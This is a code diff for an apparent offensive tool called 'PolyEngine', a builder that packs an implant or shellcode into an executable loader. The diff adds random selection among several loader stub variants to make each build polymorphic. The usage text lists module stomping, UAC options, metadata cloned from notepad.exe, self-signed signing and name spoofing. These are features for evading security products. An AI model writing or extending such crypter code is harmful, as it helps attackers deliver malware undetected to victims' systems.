@@ -163,7 +163,8 @@ static BOOL ApplyDisableList(const char* list, DWORD* pFlags) {
 typedef struct {
     const char* targetPath;       /* argv[1]  — input PE/shellcode               */
     const char* outputPath;       /* argv[2]  — output exe                        */
-    const char* stubPath;         /* --stub   — default: "stub.bin"               */
+    const char* stubPath;         /* --stub   — NULL = random stub_v0..v3.bin     */
+    char        stubPathBuf[MAX_PATH]; /* storage when resolving default pool     */
     BYTE        dll_indices[3];   /* --preset — default: PRINT (0, 1, 2)          */
     char        exportName[64];   /* --export — raw name, hashed post-parse       */
     char        exportArg[128];   /* --arg    — passed to export at runtime       */
@@ -183,7 +184,8 @@ typedef struct {
 static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
     cfg->targetPath       = NULL;
     cfg->outputPath       = NULL;
-    cfg->stubPath         = "stub.bin";
+    cfg->stubPath         = NULL;   /* NULL → resolve random stub_v*.bin later */
+    cfg->stubPathBuf[0]   = '\0';
     cfg->dll_indices[0]   = 0;  /* PRINT preset */
     cfg->dll_indices[1]   = 1;
     cfg->dll_indices[2]   = 2;
@@ -332,7 +334,7 @@ static void PrintUsage(void) {
     printf("  <output>  Output executable\n");
     printf("\n");
     printf("Loader:\n");
-    printf("  --stub <path>              Path to stub.bin  [default: ./stub.bin]\n");
+    printf("  --stub <path>              Loader stub PE  [default: random ./stub_v0.bin..stub_v3.bin]\n");
     printf("  --preset PRINT|MEDIA|NETWORK|RANDOM\n");
     printf("                             Module stomping DLL preset  [default: PRINT]\n");
     printf("  --overload                 Module overloading instead of stomping\n");
@@ -402,6 +404,53 @@ static void PrintUsage(void) {
     printf("  Builder.exe implant.exe     notepad.exe --uac --clone-meta notepad.exe --pfx self.pfx\n");
 }
 
+/* Resolve default loader stub: random among stub_v0.bin .. stub_v3.bin that exist
+ * in the current working directory.  --stub overrides this (cfg->stubPath already set). */
+static BOOL ResolveStubPath(BUILD_CONFIG* cfg) {
+    if (cfg->stubPath && cfg->stubPath[0]) {
+        DWORD attr = GetFileAttributesA(cfg->stubPath);
+        if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
+            fprintf(stderr, "[!] ERROR: stub not found: %s\n", cfg->stubPath);
+            return FALSE;
+        }
+        printf("[*] Loader stub: %s (--stub)\n", cfg->stubPath);
+        return TRUE;
+    }
+
+    static const char* kNames[4] = {
+        "stub_v0.bin", "stub_v1.bin", "stub_v2.bin", "stub_v3.bin"
+    };
+    char found[4][MAX_PATH];
+    int  nFound = 0;
+
+    for (int i = 0; i < 4; i++) {
+        DWORD attr = GetFileAttributesA(kNames[i]);
+        if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
+            strncpy_s(found[nFound], MAX_PATH, kNames[i], _TRUNCATE);
+            nFound++;
+        }
+    }
+
+    if (nFound == 0) {
+        fprintf(stderr,
+            "[!] ERROR: no stub_v0.bin .. stub_v3.bin in the current directory.\n"
+            "    Build the Stub project (Release|x64) first, or pass --stub <path>.\n");
+        return FALSE;
+    }
+
+    BYTE rnd = 0;
+    HCRYPTPROV hProv = 0;
+    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+        CryptGenRandom(hProv, 1, &rnd);
+        CryptReleaseContext(hProv, 0);
+    }
+    int pick = (int)(rnd % (BYTE)nFound);
+    strncpy_s(cfg->stubPathBuf, sizeof(cfg->stubPathBuf), found[pick], _TRUNCATE);
+    cfg->stubPath = cfg->stubPathBuf;
+    printf("[*] Loader stub: %s (random from %d variant(s))\n", cfg->stubPath, nFound);
+    return TRUE;
+}
+
 int main(int argc, char* argv[]) {
   printf("=============================================\n");
   printf("# PolyEngine - Polymorphic Mutation Engine # \n");
@@ -417,6 +466,9 @@ int main(int argc, char* argv[]) {
       PrintUsage();
       return 1;
   }
+
+  if (!ResolveStubPath(&cfg))
+      return 1;
 
   /* If --spoof-name was not provided, pick a random entry from the pool. */
   if (cfg.spoofExe[0] == '\0') {
